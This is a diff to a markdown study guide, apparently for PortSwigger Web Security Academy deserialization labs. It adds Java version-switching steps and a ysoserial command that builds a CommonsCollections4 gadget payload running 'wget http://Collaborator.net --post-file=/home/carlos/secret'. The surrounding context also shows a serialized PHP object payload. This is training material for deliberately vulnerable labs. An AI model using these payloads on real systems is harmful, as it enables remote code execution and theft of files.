@@ -1954,7 +1954,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
   
 ### YsoSerial  
 
->Intercept the admin panel page reuqest and identify the cookie named **admin-prefs**.  
+>Intercept the admin panel page request and ***identify*** the serial value of the cookie named **admin-prefs**.  
 
 ![Admin prefs serial cookie](images/admin-prefs-serial-cookie.png)  
 
@@ -1967,10 +1967,24 @@ CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secre
 ![ysoserial-rce](images/ysoserial-rce.png)  
 
 >Below is ysoserial command line execution to generate base64 encoded serialized cookie object containing payload.  
+>**IMPORTANT:** If you get error message when executing ```java -jar ysoserial <Payload>``` saying something in lines of ***java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets***, the switch to alternative java on linux with following commands.  
 
 ```bash
-java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collaborator.net --post-file=/home/carlos/secret' | base64
+java --version
+update-java-alternatives --list
+sudo update-java-alternatives --set /usr/lib/jvm/java-1.11.0-openjdk-amd64
+java --version
 ```  
+
+![Switch java version](images/switch-java-version.png)  
+  
+>Now execute ```ysoserial``` to generate base64 payload, using Java version 11. Replace session cookie with generated base64 payload and URL encode only the key characters before sending request.  
+
+```bash
+java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collaborator.net --post-file=/home/carlos/secret' | base64 -w 0
+```  
+
+![ysoserial Command](images/ysoserial-command.png)  
 
 [PortSwigger Lab: Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)  
   
